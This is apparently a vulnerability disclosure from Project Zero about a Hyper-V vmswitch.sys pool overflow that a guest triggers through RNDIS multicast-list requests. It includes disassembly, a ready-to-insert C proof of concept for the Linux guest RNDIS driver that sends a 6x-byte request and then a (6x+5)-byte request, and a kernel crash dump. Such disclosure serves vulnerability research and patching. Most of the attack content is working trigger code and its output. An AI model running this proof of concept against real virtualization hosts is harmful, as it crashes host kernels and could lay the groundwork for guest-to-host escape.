/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=688

This function is reachable by sending a RNDIS Set request with OID 0x01010209 (OID_802_3_MULTICAST_LIST) from the Guest to the Host.

This function potentially allocates a buffer based on the addresses sent.
The number of entries is determined by dividing the length of the data by 6:

.text:000000000001D717 mov eax, 0AAAAAAABh
.text:000000000001D71C mov r13b, 1
.text:000000000001D71F mul r14d
.text:000000000001D722 mov ebp, edx
.text:000000000001D724 shr ebp, 2
.text:000000000001D727 test ebp, ebp ; ebp=r14d//6
.text:000000000001D729 jz loc_31B04
.text:000000000001D72F
.text:000000000001D72F loc_1D72F: ; CODE XREF: VmsMpCommonPvtHandleMulticastOids+144CEj
.text:000000000001D72F cmp ebp, [rbx+0EE8h]
.text:000000000001D735 jz loc_31B2B
.text:000000000001D73B mov r8d, 'mcMV' ; Tag
.text:000000000001D741 mov rdx, r14 ; NumberOfBytes
.text:000000000001D744 mov ecx, 200h ; PoolType
.text:000000000001D749 mov r12, r14
.text:000000000001D74C call cs:__imp_ExAllocatePoolWithTag .text:000000000001D752 mov r14, rax
.text:000000000001D755 test rax, rax
.text:000000000001D758 jz loc_1D7E8
.text:000000000001D75E mov r8, r12 ; Size
.text:000000000001D761 mov rdx, r15 ; Src
.text:000000000001D764 mov rcx, rax ; Dst
.text:000000000001D767 call memmove

An interesting test is located at 0x1D72F.
If the number of entries is identical to the currently stored one, then we jump to this piece of code:

.text:0000000000031B2B loc_31B2B: ; CODE XREF: VmsMpCommonPvtHandleMulticastOids+F5j
.text:0000000000031B2B mov rcx, [rbx+0EE0h] ; Dst
.text:0000000000031B32 mov r8, r14 ; Size
.text:0000000000031B35 mov rdx, r15 ; Src
.text:0000000000031B38 call memmove

Note that the size of the copy operation is the size of the data. As the division is dropping the remainder component, we can overflow the allocation by 1 to 5 bytes doing the following:
- call this function with data of size 6*x
- call this function again with size 6*x+y with 1<=y<=5
  - then 6*x bytes will be allocated and stored at 0xee0
  - and x will be saved at 0xee8;
  - x will be compared with what is at 0xee8
  - being equal it will proceed copying 6*x+y in a buffer of 6*x bytes at 0xee0

If exploited successfully (not sure if it's doable), it would lead to code execution in the context of the Host R0.

Please note that this issue has been silently fixed in Windows Server 2016 TP4 (and maybe prior).

PoC (put it and call it somewhere useful in rndis_filter.c):
*/

static int rndis_pool_overflow(struct rndis_device *rdev)
{
  int ret;
  struct net_device *ndev = rdev->net_dev->ndev;
  struct rndis_request *request;
  struct rndis_set_request *set;
  struct rndis_set_complete *set_complete;
  u32 extlen = 16 * 6;
  unsigned long t;

  request = get_rndis_request(
    rdev, RNDIS_MSG_SET,
    RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen);

  if (!request)
    return -ENOMEM;

  set = &request->request_msg.msg.set_req;
  set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST
  set->info_buflen = extlen;
  set->info_buf_offset = sizeof(struct rndis_set_request);
  set->dev_vc_handle = 0;

  ret = rndis_filter_send_request(rdev, request);
  if (ret != 0)
    goto cleanup;

  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
  if (t == 0)
    return -ETIMEDOUT;
  else {
    set_complete = &request->response_msg.msg.set_complete;
    if (set_complete->status != RNDIS_STATUS_SUCCESS) {
      printk(KERN_INFO "failed to set multicast list: 0x%x\n",
        set_complete->status);
      ret = -EINVAL;
    }
  }

  put_rndis_request(rdev, request);
  request = get_rndis_request(rdev, RNDIS_MSG_SET,
    RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen + 5);

  if (!request)
    return -ENOMEM;

  set = &request->request_msg.msg.set_req;
  set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST
  set->info_buflen = extlen + 5;
  set->info_buf_offset = sizeof(struct rndis_set_request);
  set->dev_vc_handle = 0;

  ret = rndis_filter_send_request(rdev, request);
  if (ret != 0)
    goto cleanup;

  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
  if (t == 0)
    return -ETIMEDOUT;
  else {
    set_complete = &request->response_msg.msg.set_complete;
    if (set_complete->status != RNDIS_STATUS_SUCCESS) {
      printk(KERN_INFO "failed to set multicast list: 0x%x\n",
        set_complete->status);
      ret = -EINVAL;
    }
 }

cleanup:
  put_rndis_request(rdev, request);

  return ret;
}

/*
Crash dump (with Special Pool enabled for vmswitch.sys):

7: kd> !analyze -v

*******************************************************************************

* *

* Bugcheck Analysis *

* *

*******************************************************************************

DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)

An attempt was made to access a pageable (or completely invalid) address at an

interrupt request level (IRQL) that is too high. This is usually

caused by drivers using improper addresses.

If kernel debugger is available get stack backtrace.

Arguments:

Arg1: ffffcf81085c9000, memory referenced

Arg2: 0000000000000002, IRQL

Arg3: 0000000000000001, value 0 = read operation, 1 = write operation

Arg4: fffff8005fad3249, address which referenced memory

Debugging Details:

------------------

DUMP_CLASS: 1

DUMP_QUALIFIER: 401

BUILD_VERSION_STRING: 9600.18146.amd64fre.winblue_ltsb.151121-0600

...

BASEBOARD_VERSION: 

DUMP_TYPE: 1

BUGCHECK_P1: ffffcf81085c9000

BUGCHECK_P2: 2

BUGCHECK_P3: 1

BUGCHECK_P4: fffff8005fad3249

WRITE_ADDRESS: ffffcf81085c9000 Special pool

CURRENT_IRQL: 2

FAULTING_IP: 

vmswitch!memcpy+49

fffff800`5fad3249 8841ff mov byte ptr [rcx-1],al

CPU_COUNT: 8

CPU_MHZ: c88

CPU_VENDOR: GenuineIntel

CPU_FAMILY: 6

CPU_MODEL: 1a

CPU_STEPPING: 4

CPU_MICROCODE: 6,1a,4,0 (F,M,S,R) SIG: 11'00000000 (cache) 11'00000000 (init)

DEFAULT_BUCKET_ID: WIN8_DRIVER_FAULT

BUGCHECK_STR: AV

PROCESS_NAME: System

ANALYSIS_SESSION_HOST: KOSTYAK-G7700

ANALYSIS_SESSION_TIME: 12-31-2015 21:26:14.0206

ANALYSIS_VERSION: 10.0.10586.567 amd64fre

TRAP_FRAME: ffffd00187f46840 -- (.trap 0xffffd00187f46840)

NOTE: The trap frame does not contain all registers.

Some register values may be zeroed or incorrect.

rax=0000000055555500 rbx=0000000000000000 rcx=ffffcf81085c9001

rdx=0000000000001fc0 rsi=0000000000000000 rdi=0000000000000000

rip=fffff8005fad3249 rsp=ffffd00187f469d8 rbp=0000000000000010

r8=0000000000000004 r9=0000000000000000 r10=0000000000000000

r11=ffffcf81085c8fa0 r12=0000000000000000 r13=0000000000000000

r14=0000000000000000 r15=0000000000000000

iopl=0 nv up ei pl nz na pe nc

vmswitch!memcpy+0x49:

fffff800`5fad3249 8841ff mov byte ptr [rcx-1],al ds:ffffcf81`085c9000=??

Resetting default scope

LAST_CONTROL_TRANSFER: from fffff8038a3633e9 to fffff8038a3578a0

STACK_TEXT: 

ffffd001`87f466f8 fffff803`8a3633e9 : 00000000`0000000a ffffcf81`085c9000 00000000`00000002 

00000000`00000001 : nt!KeBugCheckEx

ffffd001`87f46700 fffff803`8a361c3a : 00000000`00000001 ffffe000`57002000 ffffd001`87f46900 

00000000`00000004 : nt!KiBugCheckDispatch+0x69

ffffd001`87f46840 fffff800`5fad3249 : fffff800`5fad9b3d ffffe000`57002000 00000000`0000000c 

ffffe000`57002000 : nt!KiPageFault+0x23a

ffffd001`87f469d8 fffff800`5fad9b3d : ffffe000`57002000 00000000`0000000c ffffe000`57002000 

ffffd001`87f46b00 : vmswitch!memcpy+0x49

ffffd001`87f469e0 fffff800`5fac4792 : 00000000`00000000 ffffd001`87f46ac0 00000000`01000400 

ffffe000`57002000 : vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144fd

ffffd001`87f46a60 fffff800`5fac3dc4 : 00000000`c00000bb 00000000`01010209 ffffcf81`06b62c78 

00000000`000000d0 : vmswitch!VmsMpCommonPvtSetRequestCommon+0x13e

ffffd001`87f46af0 fffff800`5fac3cf9 : ffffcf81`06b62b00 00000000`00000000 fffff800`5fac3a20 

ffffe000`53d8d880 : vmswitch!VmsMpCommonSetRequest+0xa4

ffffd001`87f46b60 fffff800`5fac3e8b : 00000000`00000000 fffff800`00000000 ffffe000`57005c10 

ffff68b8`dcfa8dfd : vmswitch!VmsVmNicPvtRndisDeviceSetRequest+0x55

ffffd001`87f46bb0 fffff800`5fac3aa3 : ffffe000`570c5f70 ffffe000`53d8d9c0 ffffe000`53d8d880 

fffff803`8a29b9f9 : vmswitch!RndisDevHostHandleSetMessage+0x77

ffffd001`87f46bf0 fffff803`8a2ee2a3 : ffffcf81`06b58fb0 ffffe000`57005c10 00000000`00000000 

ffffe000`00000000 : vmswitch!RndisDevHostControlMessageWorkerRoutine+0x83

ffffd001`87f46c20 fffff803`8a2984bf : fffff800`5e842e00 fffff803`8a2ee1a8 ffffe000`53d8d880 

00000000`00000000 : nt!IopProcessWorkItem+0xfb

ffffd001`87f46c90 fffff803`8a305554 : 00000000`00000000 ffffe000`53d8d880 00000000`00000080 

ffffe000`53d8d880 : nt!ExpWorkerThread+0x69f

ffffd001`87f46d40 fffff803`8a35dec6 : ffffd001`88741180 ffffe000`53d8d880 ffffd001`8874d3c0 

00000000`00000000 : nt!PspSystemThreadStartup+0x58

ffffd001`87f46da0 00000000`00000000 : ffffd001`87f47000 ffffd001`87f41000 00000000`00000000 

00000000`00000000 : nt!KiStartSystemThread+0x16

STACK_COMMAND: kb

THREAD_SHA1_HASH_MOD_FUNC: abaf49d1b3c5b02fccc8786e1ffe670ffc7abc52

THREAD_SHA1_HASH_MOD_FUNC_OFFSET: 95f6cd8078b8f21385352dcdeabdb4de53e87ac0

THREAD_SHA1_HASH_MOD: 7e0f522feda778d9b7c0da52391383d6f8569ca6

FOLLOWUP_IP: 

vmswitch!memcpy+49

fffff800`5fad3249 8841ff mov byte ptr [rcx-1],al

FAULT_INSTR_CODE: 75ff4188

SYMBOL_STACK_INDEX: 3

SYMBOL_NAME: vmswitch!memcpy+49

FOLLOWUP_NAME: MachineOwner

MODULE_NAME: vmswitch

IMAGE_NAME: vmswitch.sys

DEBUG_FLR_IMAGE_TIMESTAMP: 55c21a2e

BUCKET_ID_FUNC_OFFSET: 49

FAILURE_BUCKET_ID: AV_VRF_vmswitch!memcpy

BUCKET_ID: AV_VRF_vmswitch!memcpy

PRIMARY_PROBLEM_CLASS: AV_VRF_vmswitch!memcpy

TARGET_TIME: 2016-01-01T05:23:07.000Z

OSBUILD: 9600

OSSERVICEPACK: 0

SERVICEPACK_NUMBER: 0

OS_REVISION: 0

SUITE_MASK: 272

PRODUCT_TYPE: 3

OSPLATFORM_TYPE: x64

OSNAME: Windows 8.1

OSEDITION: Windows 8.1 Server TerminalServer SingleUserTS

OS_LOCALE: 

USER_LCID: 0

OSBUILD_TIMESTAMP: 2015-11-21 08:42:09

BUILDDATESTAMP_STR: 151121-0600

BUILDLAB_STR: winblue_ltsb

BUILDOSVER_STR: 6.3.9600.18146.amd64fre.winblue_ltsb.151121-0600

ANALYSIS_SESSION_ELAPSED_TIME: 465

ANALYSIS_SOURCE: KM

FAILURE_ID_HASH_STRING: km:av_vrf_vmswitch!memcpy

FAILURE_ID_HASH: {f6dcfc99-d58f-1ff6-59d1-7239f62b292b}

Followup: MachineOwner

---------
*/